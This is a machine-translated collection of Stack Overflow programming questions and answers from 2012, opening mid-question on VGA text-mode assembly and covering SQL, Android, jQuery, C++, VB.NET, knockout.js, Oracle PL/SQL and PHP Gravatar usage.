        ;mov 字节[0xB8000], 0xB500000;
        ;现在返回
        ret
结束代码：
消息：分贝 104

```

它显示的字母永远不会正确。这样做的正确方法是什么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-30T08:13:35.797

```
 mov ebx, Msg ; this loads ebx with the address of Msg, OK
    add ebx, 4 ; this increments the address by 4, OK, but why?
    mov [Msg], eax ; this stores eax into the first 4 bytes of Msg, OK, but why?
    mov byte[0xB8000], Msg ; this writes the least significant byte of the
                           ; address of Msg to the screen, not OK.
                           ; Does not make any sense. 
```

为什么不只是？：

```
mov al, [Msg]
mov [0xB8000], al 
```

`Msg`这应该在屏幕的左上角写入第一个字符（'h' 的 ASCII 码 104，正确），当然，如果您的数据段在其段描述符中的基地址为 0，并且如果你`org`是正确的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-04-01T23:15:35.570

VGA 文本模式使用地址`0xB8000`作为数组，`uint16_t`高字节用于颜色，低字节为字符代码。当前，您将字符存储在高字节中，而低字节未触及。打印随机字符的可能是随机噪声。尝试这个：

```
DisplayMessage:
mov al, byte [msg]
mov ah, 0x0F ;White Text on Black Background
mov word [0xB8000], ax
ret 
```

# xml - 基于 dtd 的 XML 验证

> ID：12659490
> 
> 赞同：0
> 
> 时间：2012-09-30T07:27:50.437
> 
> 标签：xml

以下段落来自此来源[http://en.wikipedia.org/wiki/Document_Type_Definition](http://en.wikipedia.org/wiki/Document_Type_Definition)

“请注意，任何在其 DTD 中引用外部子集的有效 SGML 或 XML 文档，或者其正文包含对其 DTD 中声明的已解析外部实体的引用（包括在其内部子集中声明的实体），只能部分解析，但不能完全解析通过在独立模式下验证 SGML 或 XML 解析器进行验证（这意味着这些验证解析器不会尝试检索这些外部实体，并且它们的替换文本将无法访问）。

有人可以用更简单的术语向我解释一下吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T07:35:35.157

好的，我明白了，这仅表示如果文档是独立文档，则只会部分解析而不是完全解析，因为外部引用将被忽略

# sql - 如何在sqlserver中将int转换为日期时间

> ID：12659493
> 
> 赞同：0
> 
> 时间：2012-09-30T07:28:49.443
> 
> 标签：sql, sql-server, unix-timestamp

我在 sqlserver 中的数据库的一个表有一个存储日期类型为 int 的列。

例如字段是：**1105275802** 或**1100330268**。

我可以使用以下代码将其转换为 php 中的日期时间：

```
(int)date('U',1100330268); 
```

我想在 sqlserver 中将此整数转换为日期时间。我能怎么做？

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T07:32:26.307

这可能很困难，因为 MS SQL 在 Windows 系统上运行，并且 date('U') 是“自 Unix 纪元以来的秒数（格林威治标准时间 1970 年 1 月 1 日 00:00:00）”。我想您可能可以计算 DateTime，但如果您不考虑 GMT 和您当地时区之间的时区变化，它可能会变得一团糟。

```
select DateAdd(second, 1100330268, '1970-01-01') 
```

# android - 不再需要数据库 - 如何从应用程序中删除数据库？

> ID：12659499
> 
> 赞同：1
> 
> 时间：2012-09-30T07:29:20.457
> 
> 标签：android, sqlite

> **可能重复：**
> [如何以编程方式从 Android 中删除 SQLite 数据库](https://stackoverflow.com/questions/4406067/how-to-delete-sqlite-database-from-android-programmatically)

在我的一个 Android 应用程序中，不再需要 SQLite 数据库。从应用程序目录中删除数据库的首选方法是什么？有没有方便的方法，还是只是对文件系统的删除？

提前致谢。

**编辑：**在这里找到它：[如何以编程方式从 Android 中删除 SQLite 数据库](https://stackoverflow.com/questions/4406067/how-to-delete-sqlite-database-from-android-programmatically)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T08:11:30.553

我相信您可能已经找到了答案，但无论如何：

```
 mContext.deleteDatabase(<Name_Of_Your_Database>); 
```

# jquery - 如何在 IE 中使用 jQuery 将焦点设置在第一个输入字段上？

> ID：12659501
> 
> 赞同：0
> 
> 时间：2012-09-30T07:29:26.947
> 
> 标签：jquery, internet-explorer

我可以将焦点放在第一个输入上，它适用于所有浏览器（IE 除外）：

```
 $('#login').on('shown', function () {
  $(login).find('input:visible:first').focus();
}) 
```

我需要在 Bootstrap 模态显示完成后调用它，所以我在显示的函数中调用它。

也试过这个代码（不工作）：

```
 $('#sign_up').on('shown', function () {
    setTimeout(function () {
    $(sign_up).find('input:visible:first').focus();
  }, 100);
 ///working everywhere except explorer
$('#login').on('shown', function () {
  $('#user_email').focus();
}) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T07:43:37.013

javascript

```
<script type="text/javascript">
function formfocus() {
  document.getElementById('element').focus();
}
window.onload = formfocus;
</script> 
```

[JAVASCRIPT 演示](http://jsfiddle.net/dvPN9/4/)

jQuery

```
$(document).ready(function(){
  $('#element').focus();
}); 
```

[查询演示](http://jsfiddle.net/dvPN9/3/)

IE 8 的 JQUERY

```
$(document).ready(function(){
  setTimeout(function() {
     $('#element').focus();
  }, 10);
}); 
```

[IE 8 演示](http://jsfiddle.net/afshinprofe/dvPN9/6/)

HTML

```
<form>
  <input id="element" />
  <input />
  <input />
</form> 
```

# c++ - 查找数组中某些元素的大小？

> ID：12659513
> 
> 赞同：2
> 
> 时间：2012-09-30T07:31:00.450
> 
> 标签：c++, arrays, string, sizeof

如何找到数组确定成员的大小。例如，我用这个声明了我的数组：

```
string myStrArray[200] = {
    "My first string",
    "My second string",
    "My last string"
} 
```

在这段代码中，有 197 个未使用的元素（或者我理解是这样）。我想通过诸如**sizeof() 之类的代码找到这个数组的某些元素（3 个元素）**。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-30T07:35:34.727

你不能。但是，您可以先将数组归零，然后计算非零元素的数量，但这需要数组包含`string*`而不是`string`.

您可以改用向量，例如：

```
std::vector<std::string> v;
v.reserve(200); // Allocate space for 200
v.push_back("My first string");
v.push_back("My second string");
v.push_back("My last string");
v.size(); // Returns 3 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T07:43:18.317

如果您确定所有非空字符串都在开头，那么您可以使用`std::find`：

```
int n = std::find(myStrArray, myStrArray + 200, "") - myStrArray; 
```

实际上，您可以使用`std::lower_bound`，这是一种二分搜索，因此比`std::find`. 但是你需要一个花哨的比较功能。如果 lhs 非空且 rhs 为空，则返回 true，否则返回 false。

如果非空元素分布稀疏，您将需要使用`std::count`：

```
int n = 200 - std::count(myStrArray, myStrArray + 200, ""); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-30T07:36:42.520

没有办法（至少在 C++ 中，据我所知）读出数组中有多少元素是确定的。你必须通过你自己的变量来做（当你“添加”元素时增加它，当“删除”时减少它）。您也可以使用 std::vector。vector.size() 返回向量的大小。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-30T07:43:34.673

您不能使用 sizeof() 来找出数组中“填充”了多少元素，您将 std::string 存储在数组中（我假设至少）并且所有元素的大小都相同（因为 std::string 的初始化后不要更改大小）。在 C++ 中，实际上没有对象改变大小，至少不是根据 sizeof(); sizeof() 将始终为类型返回相同的数字，因为它返回静态类型的大小。

如果您认为当字符串不等于“”时数组中的某个位置被“填充”，那么您可以使用以下代码来计算字符串的数量：

```
for (int i = 0; i < 200; ++i)
    if (!myStrArray[i].empty()) ++count; 
```

我建议使用 std::vector<> 代替（这几乎总是一个更好的主意）：

```
std::vector<std::string> my_strings = { "a", "b" }; // requires C++11 in C++03 use push_back()
std::cout << "Number of strings: " << my_strings.size() << std::endl; 
```

# vb.net - 如何根据源数据表上的映射列表评估条件复制不同字段名称的数据表记录？

> ID：12659518
> 
> 赞同：3
> 
> 时间：2012-09-30T07:31:33.413
> 
> 标签：vb.net, linq, system.data

我有一个 System.Data.DataTable 类型的源数据表，我必须从中生成映射列的目标数据表（考虑映射列的相同 SqlDBType。）

我有一个 MappingInfo 类的列表，其中每个 Source Datatable Column 都映射为 New Column Name，它将位于目标数据表中。

```
Public Class MappingInfo

    Public Property SourceFieldName As String
    Public Property DestinationFieldName As String

End Class 
```

我必须评估源数据表中的条件以允许在目标表中复制行数据。

我使用以下代码片段做到了这一点：

```
''Prepare destination table.

For Each oMapping In oMappingInfo  

            DestinationDataTable.Columns.Add( _
                New DataColumn(oMapping.DestinationFieldName))
        Next

        For Each oRow In SourceDataTable.Rows   ''Copy data.
            If oRow("IsActive") Then
                oDataRow = DestinationDataTable.NewRow
                For Each oMapping In oMappingInfo
                    oDataRow(oMapping.DestinationFieldName) = _
                        oRow(oMapping.SourceFieldName)
                Next
                DestinationDataTable.Rows.Add(oDataRow)
            End If
        Next 
```

主要缺点是我在源数据表中至少有 40k 条记录，并且无法从数据库中获取数据，因为只有在用户保存他的工作时才提交数据的所有更改。生成的目标表作为数据源分配给网格控件和报告以供预览。

我如何使用 Linq 有效地实现这一点，或者有人请建议我实现这一要求的最佳方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-08T16:52:22.620

我没有尝试过这个，所以我不能肯定它会更快，但在我看来，使用类似以下的东西你会得到更好的速度：

```
Dim l_destinationTable As DataTable
' This creates a copy of the structure and content
l_destinationTable = SourceTable.Copy()

For Each l_column As DataColumn in l_destinationTable.Columns
    Dim l_columnMap = oMappingInfo.FirstOrDefault( _
        Function (c) c.SourceFieldName = l_column.ColumnName )
    If l_columnMap IsNot Nothing Then
        ' Rename the column if it is mapped
        l_column.ColumnName = l_columnMap.DestinationFieldName
    Else
        ' Drop the column if it is not mapped
        l_destinationTable.Columns.Remove( l_column )
    End If
Next 
```

*注意：如果未映射的列是关系的一部分或另一列的表达式依赖于该列，则此方法将失败。此外，如果您要交换两列的名称（例如，A 将被命名为 B，B 将被命名为 A），那么您将得到一个异常，因为两列可能不会同时具有相同的名称。*

# android - 在 android 的应用程序内显示应用程序输出的屏幕

> ID：12659520
> 
> 赞同：0
> 
> 时间：2012-09-30T07:32:02.713
> 
> 标签：android

我正在编写一个 android 应用程序只是为了熟悉操作系统和 API。我想在单独的屏幕上而不是通过通知向用户展示我的应用程序正在做什么。原因是我想准确地向用户展示应用程序正在查询什么以及花了多长时间等。我在超级用户应用程序中看到了一个这样的例子，它显示了应用程序在更新自身时正在做什么。

*   有图书馆可以做到这一点吗？
*   它是否像显示一个文本框然后以编程方式填充它一样简单？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T07:45:17.240

我会这样做的。只需将状态更改推送到您的 UI 线程并在那里显示它们。您可以通过[BroadcastReceiver](http://developer.android.com/reference/android/content/BroadcastReceiver.html)来做到这一点，它旨在让后台服务与 UI 活动进行通信，或者[LocalBroadcastManager](http://developer.android.com/reference/android/support/v4/content/LocalBroadcastManager.html)，它是以前的更简单版本。

在 StackOverflow 上，您会发现许多描述如何实现它的问题。

# c# - Google Analytics Management .Net API：自定义变量名称

> ID：12659521
> 
> 赞同：1
> 
> 时间：2012-09-30T07:32:12.680
> 
> 标签：c#, .net, google-analytics

我将应用程序从使用旧版本的 Google Analytics Management API 移植到新版本：[https ://developers.google.com/analytics/devguides/config/mgmt/v3/mgmtProfileGuide](https://developers.google.com/analytics/devguides/config/mgmt/v3/mgmtProfileGuide)

如何获取用于配置文件的自定义变量的名称？

使用以前的 API，我可以编写：

```
 List<GACustomVar> result = new List<GACustomVar>();

        AccountEntry entry = _FindEntryByProfileId(profileId);

        if (entry != null)
        {
            foreach (CustomVariable variable in entry.CustomVariables)
            {
                result.Add(new GACustomVar()
                {
                    Index = int.Parse(variable.Index),
                    Name = variable.Name
                });
            }
        }

        return result; 
```

但是没有类似的东西：

```
_service.Management.Accounts.List().Fetch().Items[0]. 
```

# c# - 如何在 Android 中访问 sqlite 数据

> ID：12659522
> 
> 赞同：1
> 
> 时间：2012-09-30T07:32:23.930
> 
> 标签：c#, android, sqlite

> **可能重复：**
> [如何将现有数据库与 Android 应用程序一起使用](https://stackoverflow.com/questions/9109438/how-to-use-an-existing-database-with-an-android-application)

我正在用 c# 编写 Android 应用程序，并使用 sqlite 来存储我的数据。我想从数据库中获取数据并显示到 textview 但返回 null。

```
 protected void GetCursorView(string username, string sValue)
    {
        Android.Database.ICursor icTemp = dt.GetRecordCursor(username, sValue);
        if (icTemp != null)
        {
            icTemp.MoveToFirst();
            name.Text = icTemp.GetString(1);//name is TextView
            post.Text = icTemp.GetString(3);
        }
        else
        {
            tresult.Text = dt.Message;
        }
    } 
```

如何在 Textview 上显示来自 sqlite 的数据？

# git - 这个 git 代码是什么意思？

> ID：12659526
> 
> 赞同：1
> 
> 时间：2012-09-30T07:32:58.253
> 
> 标签：git

```
git config --global core.autocrlf true
git config --global core.safecrlf true 
```

我在 gitimmersion.com 上遇到了这个问题，我想知道这些行是做什么的？编辑：我检查了文档，但我仍然不确定我是否得到它。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-30T09:32:35.187

这两个命令将配置变量添加到**您的**全局配置文件（而不是特定于 repo）。

autocrlf 将自动转换行尾，以便它们在您的存储库（复数）中采用 LF 格式，并将根据您正在操作的操作系统将它们恢复为 LF 或 CRLF。

safecrlf 实际上将检查两个转换的往返结果，进出 repo，产生相同的结果，这样就不会发生意外损坏（如果您有一个文本文件中包含混合行结尾，则可能发生这种情况）

请查看手册页以进行更多讨论。

# hector - Hector：如何指定 CQL 版本？

> ID：12659527
> 
> 赞同：0
> 
> 时间：2012-09-30T07:33:07.730
> 
> 标签：hector

在将 Hector 与 Cassandra 1.1.5 一起使用时，我想指定 CQL 版本，特别是 CQL 3.0。

我怎样才能做到这一点？

[如何将 CQL 3.0 与 JDBC 驱动程序或 Hector 一起使用](https://stackoverflow.com/questions/11026207/how-to-use-cql-3-0-with-jdbc-drivers-or-hector)的问题的答案 没有用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T08:37:35.380

对于 cassandra-jdbc，可以在创建数据源对象时指定。

```
CassandraDataSource cds = new CassandraDataSource(host, port, keyspace, user, password, "3.0.0") 
```

# asp.net-mvc-3 - ASP.NET MVC 3 客户端方法使用属性根据相关字段的值显示或隐藏字段

> ID：12659533
> 
> 赞同：0
> 
> 时间：2012-09-30T07:34:03.300
> 
> 标签：asp.net-mvc-3

对于我的模型，我需要一个类似于以下的属性：

```
[Required (ErrorMessage = "Please select yes or no")]
public bool IsAlien {get; set; }

[ConditionalDisplayIfTrue ("IsAlien ")]
public string NameOfGalaxy {get; set;} 
```

如果选择 IsAlien，则显示或隐藏文本框客户端。

很容易在 jQuery/Jvascript 中硬连线它，但我想*正确地*做到这一点并且不知道从哪里开始。

我的意思是添加自定义属性和自定义 JavaScript 以连接不显眼的 JavaScript 验证。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T07:54:51.723

我认为通过 jQuery/Javascript 执行此*操作是*正确的方法。您使用的任何 C# 库都将在服务器上生成必需的 javascript 并将其发送回浏览器。我现在不知道任何支持此功能的库，但是对于如此简单的事情，我宁愿控制我的 javascript 而不是使用其他人。

# android - 在android通话期间来电？

> ID：12659536
> 
> 赞同：2
> 
> 时间：2012-09-30T07:34:46.497
> 
> 标签：android, broadcastreceiver, call, telephony, phone-state-listener

我正在运行以下代码，它正在编译，但我没有得到任何结果或 toast 显示请帮助...

CustomBroadcastReceiver.java 此类将接收动作电话状态更改并将实例化customephonestatelistener

```
public class CustomBroadcastReceiver extends BroadcastReceiver {

TelephonyManager telephony = 
(TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);

CustomPhoneStateListener customPhoneListener = new CustomPhoneStateListener(context);

telephony.listen(customPhoneListener, PhoneStateListener.LISTEN_CALL_STATE);

Bundle bundle = intent.getExtras();
String phoneNr= bundle.getString("incoming_number");
    Log.v(TAG, "phoneNr: "+phoneNr);
    Toast toast = Toast.makeText(context, "phoneNr: "+phoneNr, Toast.LENGTH_LONG);
    toast.show();
}
} 
```

CustomPhonestateListener.java

这个类是主要的操作类

```
public class CustomPhoneStateListener extends PhoneStateListener {

private static final String TAG = "CustomPhoneStateListener";

private Context mContext;

public CustomPhoneStateListener(Context context) {

// TODO Auto-generated constructor stub
mContext = context;
}

public void onCallStateChanged(int state, String incomingNumber){

    Log.v(TAG, "WE ARE INSIDE!!!!!!!!!!!");

     Log.v(TAG, incomingNumber);
    Toast toast = Toast.makeText(mContext, "WE ARE INSIDE!!!!!!!!!!!", Toast.LENGTH_LONG);
    toast.show();

    switch(state){
            case TelephonyManager.CALL_STATE_RINGING:
                    Log.d(TAG, "RINGING");
                    break;
    } 
```

AndroidManifest.xml

```
 <uses-permission android:name="android.permission.RECEIVE_SMS" />
  <uses-permission android:name="android.permission.INTERNET" />
  <uses-permission android:name="android.permission.WRITE_CONTACTS" />
  <uses-permission android:name="android.permission.READ_PHONE_STATE" />

<application
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:theme="@style/AppTheme" >
    <receiver android:name=".MyBroadcastReceiver">
            <intent-filter>
                    <action android:name="android.intent.action.PHONE_STATE" />

            </intent-filter>
    </receiver>
</application> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T11:25:07.630

Thnx 的答案...我尝试了另一种方法，以下代码似乎有效..加入了接收器和 phonestatelistener..**但现在的问题是我必须重新启动设备才能启动此服务**..任何建议我在哪里现在错了？？

```
public class IncomingCallReciever extends BroadcastReceiver {

private Context mContext;
private Intent mIntent;

@Override
public void onReceive(Context context, Intent intent) {
    mContext = context;
    mIntent = intent;
    TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
    int events = PhoneStateListener.LISTEN_CALL_STATE;
    tm.listen(phoneStateListener, events);
}

private final PhoneStateListener phoneStateListener = new PhoneStateListener() {
    @Override
    public void onCallStateChanged(int state, String incomingNumber) {
        String callState = "UNKNOWN";
        switch (state) {
        case TelephonyManager.CALL_STATE_IDLE:
            callState = "IDLE";
            break;
        case TelephonyManager.CALL_STATE_RINGING:
            // -- check international call or not.
            if (incomingNumber.startsWith("00")) {
                Toast.makeText(mContext,"International Call- " + incomingNumber,Toast.LENGTH_LONG).show();
                callState = "International - Ringing (" + incomingNumber+ ")";
            } else {
                Toast.makeText(mContext, "Local Call - " + incomingNumber, Toast.LENGTH_LONG).show();
                callState = "Local - Ringing (" + incomingNumber + ")";
            }
            break;
        case TelephonyManager.CALL_STATE_OFFHOOK:
            String dialingNumber = mIntent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            if (dialingNumber.startsWith("00")) {
                Toast.makeText(mContext,"International - " + dialingNumber,Toast.LENGTH_LONG).show();
                callState = "International - Dialing (" + dialingNumber+ ")";
            } else {
                Toast.makeText(mContext, "Local Call - " + dialingNumber,Toast.LENGTH_LONG).show();
                callState = "Local - Dialing (" + dialingNumber + ")";
            }
            break;
        }
        Log.i(">>>Broadcast", "onCallStateChanged " + callState);
        super.onCallStateChanged(state, incomingNumber);
    }
};

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T13:24:42.453

问题出在你的清单文件中，你必须有这个：

```
<receiver android:name=".MyReceiver" >
<intent-filter>
<action android:name="android.intent.action.PHONE_STATE" />
<action android:name="android.intent.action.NEW_OUTGOING_CALL" />                
</intent-filter>
</receiver> 
```

代替 ：

```
<receiver android:name=".MyReceiver" >
<intent-filter>
<action android:name="android.intent.action.BOOT_COMPLETED" />                
</intent-filter>
</receiver> 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-06-08T11:48:30.110

***“但现在的问题是我必须重新启动设备才能启动这项服务......有什么建议我现在错了吗？？”***

您必须重新启动手机的原因是在您的 AndroidManifest.xml 文件中您只允许执行一项操作...

```
<!-- Your Problem is here -->
<action android:name="android.intent.action.BOOT_COMPLETED" /> 
```

您已将 BroadcastReceiver 设置为仅在手机启动时启动。
要解决此问题，您需要使用 DR VOLT 提供的答案。

只需将操作 PHONE_STATE 和 NEW_OUTGOING_CALL 添加到您的接收器
例如：

```
<receiver android:name=".MyReceiver" >
<intent-filter>
<action android:name="android.intent.action.PHONE_STATE" />
<action android:name="android.intent.action.NEW_OUTGOING_CALL" />
<action android:name="android.intent.action.BOOT_COMPLETED" />           
</intent-filter>
</receiver> 
```

每当这些操作发生时，这将启动您的广播接收器。

# javascript - 如何从同一 viewModel 中的不同分支访问后代？

> ID：12659544
> 
> 赞同：1
> 
> 时间：2012-09-30T07:36:25.767
> 
> 标签：javascript, asp.net-mvc-3, knockout.js, upshot

我目前正在开发一个网站 spa 应用程序并尝试使用 knockout.js。它在一个 mvc 平台上，一个 dbdatacontroller api 使用数据和 javascript 视图模型的结果。我有一个复杂的视图模型并且遇到了困难，主要是因为是新手。我最大的问题似乎是访问 observables。数据库是这样组织的：

```
 function AdvanceSearch(data) {
var self = this;
self.AdvanceSearchID = ko.observable(data.AdvanceSearchID);
self.FieldTypeEnum = ko.observable(data.FieldTypeEnum);
self.AnswerType = ko.observable(data.AnswerType);
self.UserValues = ko.observableArray(ko.utils.arrayMap(data.UserValues, function (item) {
    return new UserValue(item);
}));
upshot.addEntityProperties(self, "AdvanceSearch:#A.Lib.Repository");
};

function UserValue(data) {
var self = this;

self.UserProfileID = ko.observable(data.UserProfileID);
self.LoginID = ko.observable(data.LoginID);
self.AdvanceSearchID = ko.observable(data.AdvanceSearchID);
self.FieldValueCount = ko.observable(data.FieldValueCount);
self.FieldValueText = ko.observable(data.FieldValueText);
    upshot.addEntityProperties(self, "UserValue:#A.Lib.Repository");
});
};

function AnswerType(data) {
var self = this;
self.AnswerTypeID = ko.observable(data.AnswerTypeID);
self.AnswerTypeText = ko.observable(data.AnswerTypeText);
self.Answers = ko.observableArray(ko.utils.arrayMap(data.Answers, function (item) {
    return new Answer(item);
}));
self.AnswerSliders = ko.observableArray(ko.utils.arrayMap(data.AnswerSliders, function (item) {
    return new AnswerSlider(item);
}));
upshot.addEntityProperties(self, "AnswerType:#A.Lib.Repository");
}

function Answer(data) {
var self = this;
self.AnswerTypeID = ko.observable(data.AnswerTypeID);
self.AnswerEnum = ko.observable(data.AnswerEnum);
self.AnswerText = ko.observable(data.AnswerText);
upshot.addEntityProperties(self, "Answer:#A.Lib.Repository");
}

function AnswerSlider(data) {
var self = this;
self.SliderID = ko.observable(data.SliderID);
self.AnswerTypeID = ko.observable(data.AnswerTypeID);
self.SliderType = ko.observable(data.SliderType);
self.Seed = ko.observable(data.Seed);
upshot.addEntityProperties(self, "AnswerSlider:#A.Lib.Repository");
} 
```

我的视图模型就是这样的：

```
function ASViewModel() {
// Private
var self = this;
var dataSourceOptions = {
    providerParameters: {
        url: "/api/Dating",
        operationName: "GetDatingProfile"
    },
    entityType: "AdvanceSearch:#A.Lib.Repository",
    bufferChanges: false,
    mapping: AdvanceSearch
};

// Public Properties
self.dataSource = new upshot.RemoteDataSource(dataSourceOptions)
                            .refresh();
self.AdvanceSearchs = self.dataSource.getEntities();
} 
```

所以我的标记类似于

```
 <ol data-bind="foreach: AdvanceSearch">
   <!-- ko if: FieldTypeEnum()===5 -->
       <select data-bind="options: AnswerType().Answers, optionsText: 'AnswerText', optionsValue: 'AnswerEnum', optionsCaption: 'Not Specified', value: UserValues().FieldValueText"></select>
   <!-- /ko -->
    <!-- ko if: FieldTypeEnum()===11 -->
        <input type="text" class="multilinetext" data-bind="attr: { id: 'value_'+AdvanceSearchID()}, value: UserValues().FieldValueText" />
    <!-- /ko --> 
```

所以基本上，无论我做什么，我似乎都无法访问项目的值。我访问过一个分支的任何地方，即。`AdvanceSearch().AnswerType().Answers`，试图得到`$parents[1].UserValues[].FieldValueText`似乎总是不确定的。就像我说的，我是淘汰赛的新手，所以我可能只是错过了一些东西。还是我应该使用多个视图模型或类似的东西？（如果是这样，我该怎么做？）谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-01T09:45:58.300

您的：

```
<ol data-bind="foreach: AdvanceSearch"> 
```

需要是：

```
<ol data-bind="foreach: AdvanceSearchs"> 
```

注意 AdvanceSearch 到**AdvanceSearchs的复数形式**

**编辑：**

此外，`UserValues`它是一个 Observable 数组，因此您无法访问`UserValues().FieldValueText`.

请注意确切地确定您的预期输出是什么，但这会显示每个输入`UserValue`：

```
<!-- ko foreach: UserValues -->
    <input type="text" class="multilinetext" data-bind="attr: { id: 'value_'+UserProfileID()}, value: FieldValueText" />
<!-- /ko --> 
```

**注意：**我已经将输入的 ID 更改为其他内容以避免重复的 ID——这假设`UserProfileID`每个 ID 都是唯一的`UserValue`

**更远，**

[能否请您参考Knockouts options-binding](http://knockoutjs.com/documentation/options-binding.html)的文档。`select`元素的数据绑定选项是：

`options:`- 这是将`select`元素绑定到的选项列表

`optionsText:`对于列表中的每个项目，要在`select`元素中显示的属性

`optionsCaption:``select`元素的第一个/“虚拟”项的文本

**`value:`这应该是一个可观察的并且绑定到`select`元素的当前选择**

`value`绑定是 Knockout 的一个非常方便的功能。它消除了担心 ID 的需要——因此`optionsValue`——因为您可以访问整个选定的对象。

所以你的`select`绑定看起来像：

```
<select data-bind="options: AnswerType().Answers,
                   optionsText: 'AnswerText',
                @* optionsValue: 'AnswerEnum', *@
                   optionsCaption: 'Not Specified',
                   value: selectedAnswer"></select> 
```

假设您已向视图模型添加了一个 observable `selectedAnswer`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-01T17:28:20.950

根据您的评论，我想我现在知道您要做什么。我将把它抽象化，以便更容易理解，因为您的 ViewModel 和对象非常复杂，如果没有解释就不容易理解。

如果您有对象类型`Book`和`Author`构造函数：

```
function Book(data) {
    this.ISBN = ko.observable( data.ISBN );
    this.Title = ko.observable( data.Title );
    this.AuthorID = ko.observable( data.AuthorID );
    /* other properties */
}

function Author(data) {
    this.AuthorID = ko.observable( data.AuthorID );
    this.Name = ko.observable( data.Name );
    /* other properties */
} 
```

要从`select`框中选择一本书并将`input`显示绑定到作者姓名，您将需要视图模型：

```
var vm = {};
vm.books = ko.observableArray( /* initial data */ );
vm.authors = ko.observableArray( /* initial data */ );
vm.selectedBook = ko.observable(null);
vm.selectedBooksAuthor = ko.computed( function() {
    var authors = vm.authors(),
        selectedBook = vm.selectedBook();
    if( !selectedBook ) return null; // cannot get .AuthorID() if selectedBook == null
    var id = selectedBook.AuthorID();
    for( var a in authors ) {
        if( authors[a].AuthorID() == id )
            return authors[a];
    }
}) 
```

还有你的 HTML：

```
<select data-bind="options: books,
                   optionsText: 'Title',
                   optionsCaption: 'Select a book...',
                   value: selectedBook"></select>
<!-- ko with: selectedBooksAuthor -->
<input type="text" data-bind="value: Name" />
<!-- /ko --> 
```

请注意，这在大量数据上可能会变得非常低效——考虑为您的`computed observable`ie使用更好的搜索算法（而不是此处使用的“线性”）`selectedBooksAuthor`

**编辑：**

请参阅[此小提琴](http://jsfiddle.net/CkNf6/)以进行工作演示。

# stored-procedures - Oracle 存储过程的输出

> ID：12659545
> 
> 赞同：2
> 
> 时间：2012-09-30T07:36:27.593
> 
> 标签：stored-procedures, plsql, oracle11g

我有以下存储过程：

```
create or replace PROCEDURE A2CountSkus
(v_count out Number )
AS
 BEGIN 
   SELECT count(*)
      INTO v_count
      FROM a2sku;
   EXCEPTION 
 When Others THEN
    RAISE;
END A2CountSkus; 
```

当我运行这个脚本时。

```
SET SERVEROUTPUT ON 
BEGIN 
DBMS_OUTPUT.PUT_LINE('SKU COUNT ' || A2CountSkus); 
END; 
/ 
```

它没有打印输出，而是给出了错误。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T07:49:21.877

首先，通常，如果您有一个命名的 PL/SQL 块，其唯一目的是返回一个值，您将声明一个函数而不是一个过程。如果您已声明`A2CountSkus`为返回数字的函数，则您要使用的语法将起作用。

其次，您不想要那个异常子句——它没有任何用处。它应该被淘汰。

第三，如果您确实希望块是一个过程，调用者需要声明一个可以传递给过程的局部变量，然后打印局部变量中的值。

如果你想声明一个函数

```
create or replace FUNCTION A2CountSkus
  return integer
AS
  l_count integer;
BEGIN 
  SELECT count(*)
    INTO l_count
    FROM a2sku;
  RETURN l_count;
END A2CountSkus; 
```

如果您确定要声明一个过程，则调用者需要类似于

```
DECLARE
  l_count integer;
BEGIN 
  A2CountSkus( l_count );
  DBMS_OUTPUT.PUT_LINE('SKU COUNT ' || l_count); 
END; 
```

# ios - 如何在 OSX 或 iOS 中扩展钥匙串？

> ID：12659549
> 
> 赞同：0
> 
> 时间：2012-09-30T07:36:44.677
> 
> 标签：ios, keychain

我可以在钥匙串中存储密码之外的其他内容，例如生物识别信息吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T08:09:44.287

我不认为钥匙串是用来安全存储用户数据的，除了小的安全笔记。也许最好采用以下方法，它允许用户轻松地在多台计算机之间安全地传输他的数据。

1.  向用户询问密码（一次）。
2.  将使用该密码加密的数据存储在文件系统上（使用 OpenSSL 或其他库）
3.  将带有文件名的**密码存储在钥匙串中**
4.  当用户打开文件时，向钥匙串询问文件的密码。除非用户手动阻止您的应用程序访问该密码，否则钥匙串不会向用户显示密码对话框。它只会给你密码。

# php - php自动头像生成？

> ID：12659550
> 
> 赞同：1
> 
> 时间：2012-09-30T07:36:47.467
> 
> 标签：php, image

有没有好的php自动头像生成？我见过很多像[WP_MonsterID](http://scott.sherrillmix.com/blog/blogger/wp_monsterid/)和[WP_Identicon](http://scott.sherrillmix.com/blog/blogger/wp_identicon/)但都有 wordpress 插件。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-30T08:27:08.567

[您可以使用Gravatar](http://gravatar.com)之类的东西，然后只需对电子邮件地址进行哈希处理，并让用户知道为了更改他们的头像，他们会前往 gravatar.com 进行更改。

比如做一个64像素的图片

```
<?
$email = "my@whatever.com";
$hash = md5(strtolower(trim($email)));
echo "<img src='http://gravatar.com/avatar/$hash?size=64&d=identicon' />
?> 
```

